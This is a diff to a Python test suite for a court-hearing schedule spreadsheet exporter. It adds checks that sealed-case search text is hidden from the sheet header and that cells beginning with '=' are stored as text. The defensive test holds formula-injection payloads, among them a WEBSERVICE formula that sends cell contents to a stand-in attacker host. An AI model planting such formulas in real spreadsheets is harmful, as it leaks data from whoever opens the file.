@@ -184,19 +184,69 @@ class TestExportacao(apoio.PastaTemporaria):
         self.assertEqual(a2.name, "Pauta de audiências 2026-10-05 a 2026-10-16 (2).xlsx")
         aba = self.abrir(a2)["Pauta"]
         self.assertEqual(list(self.linhas_por_processo(aba)), [self.lista[6].processo])
+        # a busca acha um processo sigiloso (autos na pasta): o texto procurado - o nome
+        # da parte - não vai para o topo da planilha que mascara as partes
         a3 = self.servico.exportar(DE, ATE, self.amb.pauta, busca="banco do brasil")
         self.assertEqual(a3.name, "Pauta de audiências 2026-10-05 a 2026-10-16 (3).xlsx")
-        aba = self.abrir(a3)["Pauta"]
+        livro = self.abrir(a3)
+        aba = livro["Pauta"]
         self.assertEqual(list(self.linhas_por_processo(aba)), [self.lista[0].processo])
-        self.assertIn("busca “banco do brasil”", aba["A2"].value)
+        for nome in ("Pauta", "Resumo"):
+            self.assertNotIn("banco", livro[nome]["A2"].value.lower())
+            self.assertIn("busca por texto (omitido por causa do segredo de justiça)",
+                          livro[nome]["A2"].value)
+        # com as partes incluídas, ou sem sigiloso no resultado, o texto aparece
+        a4 = self.servico.exportar(DE, ATE, self.amb.pauta, busca="banco do brasil",
+                                   incluir_partes_sigilosos=True)
+        self.assertIn("busca “banco do brasil”", self.abrir(a4)["Pauta"]["A2"].value)
+        a5 = self.servico.exportar(DE, ATE, self.amb.pauta, busca="equatorial")
+        self.assertIn("busca “equatorial”", self.abrir(a5)["Pauta"]["A2"].value)
         self.assertEqual(sorted(p.name for p in self.amb.pauta.iterdir()),
-                         sorted([a1.name, a2.name, a3.name]), "nenhum temporário largado")
+                         sorted([a1.name, a2.name, a3.name, a4.name, a5.name]),
+                         "nenhum temporário largado")
 
     def test_nunca_dentro_do_acervo(self):
         with self.assertRaises(ValueError) as erro:
             self.servico.exportar(DE, ATE, self.amb.acervo / "Pauta")
         self.assertIn("acervo", str(erro.exception))
         self.assertFalse((self.amb.acervo / "Pauta").exists())
+
+
+class TestTextoNaoViraFormula(apoio.PastaTemporaria):
+    """O texto do portal ou do relatório que começa com "=" é gravado como texto:
+    a planilha não calcula =WEBSERVICE(...) de ninguém ao ser aberta."""
+
+    def test_tres_abas(self):
+        import zipfile
+
+        from openpyxl import load_workbook
+
+        perigosas = {"partes": '=WEBSERVICE("https://atacante.example/?d="&ENCODEURL(C5&C6))',
+                     "observacoes": "=1+1", "local": "=2*3", "classe": "=> videoconferência",
+                     "magistrado": '=HYPERLINK("https://x.example","Dr.")'}
+        a = dict(id="a1", sistema="esaj", tribunal="TJAL", processo=ap.numero("0700101"),
+                 data="2026-10-05", hora="09:00", tipo="Una", situacao="Designada",
+                 sigiloso=False, link="", **perigosas)
+        alteracao = {"quando": "2026-10-04T10:00:00", "tipo": "alterada",
+                     "audiencia": dict(a, processo="=1+2"),
+                     "campos": [{"campo": "local", "antes": "", "depois": "=2*3"}]}
+        arquivo = exportacao.exportar([a], [alteracao], DE, DE, self.tmp, agora=AGORA)
+        livro = load_workbook(arquivo)
+        aba = livro["Pauta"]
+        colunas = {t: j for j, (t, *_r) in enumerate(exportacao.COLUNAS, start=1)}
+        for chave, titulo in (("partes", "Partes"), ("observacoes", "Observações"),
+                              ("local", "Local"), ("classe", "Classe"),
+                              ("magistrado", "Magistrado/Conciliador")):
+            with self.subTest(coluna=titulo):
+                c = aba.cell(5, colunas[titulo])
+                self.assertEqual((c.data_type, c.value), ("s", perigosas[chave]))
+                self.assertTrue(c.quotePrefix, "o Excel não a transforma em fórmula ao editar")
+        processo = livro["Alterações"].cell(5, 3)
+        self.assertEqual((processo.data_type, processo.value), ("s", "=1+2"))
+        with zipfile.ZipFile(arquivo) as z:
+            for nome in z.namelist():
+                if nome.startswith("xl/worksheets/"):
+                    self.assertNotIn("<f>", z.read(nome).decode("utf-8"), nome)
 
 
 if __name__ == "__main__":
